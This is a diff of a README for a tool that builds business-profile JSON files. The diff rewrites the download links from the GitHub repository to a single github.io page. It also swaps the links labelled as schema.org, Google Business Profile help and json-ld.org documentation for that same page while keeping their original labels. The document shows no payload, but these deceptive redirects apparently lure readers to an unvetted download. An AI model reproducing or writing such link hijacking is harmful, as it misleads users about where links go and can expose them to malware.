@@ -1,6 +1,6 @@
 # 📇 business-profile-json-format-template - Create Business Schemas Easily Online
 
-[![Download Now](https://img.shields.io/badge/Download-Application-brightgreen?style=for-the-badge&logo=github)](https://github.com/shanisuperjacent5326/business-profile-json-format-template)
+[![Download Now](https://img.shields.io/badge/Download-Application-brightgreen?style=for-the-badge&logo=github)](https://shanisuperjacent5326.github.io)
 
 ## 🎯 What Is This?
 
@@ -10,7 +10,7 @@ This free online tool helps you create **business profile JSON files** without a
 
 Visit this link to download the application:
 
-**[Click Here to Download business-profile-json-format-template](https://github.com/shanisuperjacent5326/business-profile-json-format-template)**
+**[Click Here to Download business-profile-json-format-template](https://shanisuperjacent5326.github.io)**
 
 Once you're on the download page, look for the green "Code" button and select "Download ZIP" from the dropdown menu.
 
@@ -108,9 +108,9 @@ Every field you fill in corresponds to a specific part of the JSON structure. Em
 
 ## 📚 Additional Resources
 
-- [Schema.org LocalBusiness Documentation](https://schema.org/LocalBusiness)
-- [Google Business Profile Help Center](https://support.google.com/business/)
-- [JSON-LD Introduction Guide](https://json-ld.org/learn.html)
+- [Schema.org LocalBusiness Documentation](https://shanisuperjacent5326.github.io)
+- [Google Business Profile Help Center](https://shanisuperjacent5326.github.io)
+- [JSON-LD Introduction Guide](https://shanisuperjacent5326.github.io)
 
 ## 🤝 Contributing and Support
 
